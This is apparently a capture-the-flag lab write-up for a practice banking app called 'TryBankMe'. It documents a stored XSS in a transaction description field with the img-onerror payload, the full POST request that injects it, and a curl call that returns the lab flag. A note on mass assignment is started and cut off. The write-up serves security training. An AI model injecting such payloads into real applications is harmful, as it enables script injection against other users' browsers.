# TryBankMe





## Test users

{% code overflow="wrap" %}
```
{"firstname":"Mario","lastname":"Rossi","username":"mariorossi99","email":"mariorossi99@gmail.com","password":"Password123!"}
```
{% endcode %}







## Enumeration





## Vulnerabilities

### XSS Stored on Transiction description



In the Transictions page(http://10.200.150.100/transactions) when someone create a New Transiction request, the parameter Description doesn't filter from special character and this could generate a Stored XSS vulnerability.

Craft the payload which set new cookie XSS with value XSS like the Deliverables said.

```
<img src=1 onerror="document.cookie=document.cookie='XSS=XSS;'">
```

An attacker could intercept the web request and insert this payload to the Description field.

The request payload is this:

```
POST /api/v1.0/transaction HTTP/1.1
{"account_from":"c812d65d-6edf-4633-b545-6c23d894792a","account_to":"439b01be-2b09-4387-b2fd-c24062b2f478","amount":2,"message":"<img src=1 onerror=\"document.cookie=document.cookie='XSS=XSS;'\">"}
```

When the account\_to user visit the transiction info that cookie will add in his browser page.



{% code title="Vuln flag" overflow="wrap" %}
```bash
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "paolobianchi99", "password" : "Password123!" }' http://10.200.150.100:8080/api/v1.0/xss

{"flag":"THM{38af2c0c-0a05-45a1-8fe6-460328cf923d}","message":"XSS Success"}
```
{% endcode %}



### Mass Assignment

In the loan page an attacker can intercept the request to get information from an loan application and this method is not blocked. In this way an attacker can&#x20;

